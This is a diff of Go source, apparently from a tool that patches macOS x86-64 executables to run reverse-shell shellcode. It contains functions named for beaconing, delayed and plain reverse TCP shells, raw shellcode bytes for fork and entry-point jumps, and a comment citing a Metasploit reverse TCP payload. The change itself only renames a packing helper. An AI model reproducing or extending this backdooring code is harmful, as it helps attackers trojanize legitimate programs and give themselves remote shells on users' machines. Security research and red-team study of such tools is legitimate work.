@@ -45,7 +45,7 @@ func beaconing_reverse_shell_tcp_darwin_intel_64(params api.Parameters) ([]byte,
 
 	shellcode2 += "\xB8\x74\x00\x00\x02\x0f\x05" // put system time in rax
 	shellcode2 += "\x48\x05"
-	if as, err := api.PackAddr(beacon); err == nil { // add rax, 15  for seconds
+	if as, err := api.PackUint32(beacon); err == nil { // add rax, 15  for seconds
 		shellcode2 += as
 	} else {
 		return nil, err
@@ -60,13 +60,13 @@ func beaconing_reverse_shell_tcp_darwin_intel_64(params api.Parameters) ([]byte,
 	shellcode1 += "\x0f\x84"                             // \x4c\x03\x00\x00"  // <-- Points to LC_MAIN/LC_UNIXTREADS offset
 
 	if int(entry) < 0 {
-		if as, err := api.PackAddr(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
+		if as, err := api.PackUint32(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
 			shellcode1 += as
 		} else {
 			return nil, err
 		}
 	} else {
-		if as, err := api.PackAddr(uint32(len(shellcode2)) + entry); err == nil {
+		if as, err := api.PackUint32(uint32(len(shellcode2)) + entry); err == nil {
 			shellcode1 += as
 		} else {
 			return nil, err
@@ -84,7 +84,7 @@ func delay_reverse_tcp_shell_darwin_intel_64(params api.Parameters) ([]byte, err
 	//From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
 	shellcode2 := "\xB8\x74\x00\x00\x02\x0f\x05" // put system time in rax
 	shellcode2 += "\x48\x05"
-	if as, err := api.PackAddr(beacon); err == nil { // add rax, 15  for seconds
+	if as, err := api.PackUint32(beacon); err == nil { // add rax, 15  for seconds
 		shellcode2 += as
 	} else {
 		return nil, err
@@ -114,13 +114,13 @@ func delay_reverse_tcp_shell_darwin_intel_64(params api.Parameters) ([]byte, err
 	shellcode1 := "\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2" // FORK()
 	shellcode1 += "\x0f\x84"                             // \x4c\x03\x00\x00"  // <-- Points to LC_MAIN/LC_UNIXTREADS offset
 	if int(entry) < 0 {
-		if as, err := api.PackAddr(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
+		if as, err := api.PackUint32(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
 			shellcode1 += as
 		} else {
 			return nil, err
 		}
 	} else {
-		if as, err := api.PackAddr(uint32(len(shellcode2)) + entry); err == nil {
+		if as, err := api.PackUint32(uint32(len(shellcode2)) + entry); err == nil {
 			shellcode1 += as
 		} else {
 			return nil, err
@@ -155,13 +155,13 @@ func reverse_tcp_shell_darwin_intel_64(params api.Parameters) ([]byte, error) {
 	shellcode1 := "\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2" // FORK()
 	shellcode1 += "\x0f\x84"                             // \x4c\x03\x00\x00"  // <-- Points to LC_MAIN/LC_UNIXTREADS offset
 	if int(entry) < 0 {
-		if as, err := api.PackAddr(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
+		if as, err := api.PackUint32(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
 			shellcode1 += as
 		} else {
 			return nil, err
 		}
 	} else {
-		if as, err := api.PackAddr(uint32(len(shellcode2)) + entry); err == nil {
+		if as, err := api.PackUint32(uint32(len(shellcode2)) + entry); err == nil {
 			shellcode1 += as
 		} else {
 			return nil, err
@@ -178,13 +178,13 @@ func user_shellcode_darwin_intel_64(params api.Parameters) ([]byte, error) {
 	shellcode1 := "\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2" // FORK()
 	shellcode1 += "\x0f\x84"                             // \x4c\x03\x00\x00"  // <-- Points to LC_MAIN/LC_UNIXTREADS offset
 	if int(entry) < 0 {
-		if as, err := api.PackAddr(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
+		if as, err := api.PackUint32(uint32(len(shellcode1)) + uint32(0xffffffff) + entry); err == nil {
 			shellcode1 += as
 		} else {
 			return nil, err
 		}
 	} else {
-		if as, err := api.PackAddr(uint32(len(supplied_shellcode)) + entry); err == nil {
+		if as, err := api.PackUint32(uint32(len(supplied_shellcode)) + entry); err == nil {
 			shellcode1 += as
 		} else {
 			return nil, err
